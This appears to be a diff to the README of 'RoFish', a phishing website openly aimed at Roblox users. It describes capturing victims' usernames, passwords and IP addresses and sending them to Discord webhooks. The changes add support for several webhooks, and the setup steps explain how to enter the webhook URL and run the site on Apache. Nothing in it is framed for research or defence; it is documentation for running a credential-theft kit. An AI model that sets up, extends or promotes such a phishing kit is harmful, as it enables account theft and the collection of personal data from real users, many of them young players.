@@ -5,11 +5,12 @@
 [![HTML5](https://img.shields.io/badge/HTML-5-orange.svg?style=flat-square)](https://developer.mozilla.org/en-US/docs/Web/Guide/HTML/HTML5)
 [![CSS3](https://img.shields.io/badge/CSS-3-blue.svg?style=flat-square)](https://developer.mozilla.org/en-US/docs/Web/CSS)
 [![JavaScript](https://img.shields.io/badge/JavaScript-ES6-yellow.svg?style=flat-square)](https://developer.mozilla.org/en-US/docs/Web/JavaScript)
+[![PHP](https://img.shields.io/badge/PHP-7.4-blue.svg?style=flat-square)](https://www.php.net/)
 ![OS](https://img.shields.io/badge/Tested%20On-Windows%20|%20Android-yellowgreen.svg?style=flat-square)
 [![License](https://img.shields.io/badge/License-MIT-blue.svg?style=flat-square)](https://github.com/yourusername/bloxbets/blob/main/LICENSE)
 
 ## 🌐 RoFish
-RoFish is an easy to use phishing website that enables users to conduct phishing attacks quickly and efficiently. Website is designed to capture login information and IP addresses from users who attempt to log in.
+RoFish website is a Roblox phishing site designed to collect informations from users, including their usernames, passwords, and IP addresses, which are then sent to a Discord webhook.
 
 ## ⭐ v2 Features
 - **Discord Webhook**: Instead of saving the login data to a text file, the data is now sent to a Discord webhook(s).
@@ -31,7 +32,11 @@ RoFish is an easy to use phishing website that enables users to conduct phishing
 
 3. **Modify the Discord Webhook**: Open the PHP file where the webhook is defined. Find the following line and replace `YOUR_WEBHOOK_URL_HERE` with your actual Discord webhook URL:
    ```bash
-   $webhookUrl = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_URL_HERE'; // Replace with your actual Discord webhook URL
+   $webhookUrls = [
+        'https://discord.com/api/webhooks/YOUR_WEBHOOK_URL_HERE',  // Replace with your actual Discord webhook URL
+        // Add more webhook URLs here if you want
+        // 'https://discord.com/api/webhooks/another_webhook_url', // Example additional webhook
+    ];
 
 2. **Start Apache**: Before opening the website, ensure that Apache is running.
    - On Windows, you can use [XAMPP](https://www.apachefriends.org/).
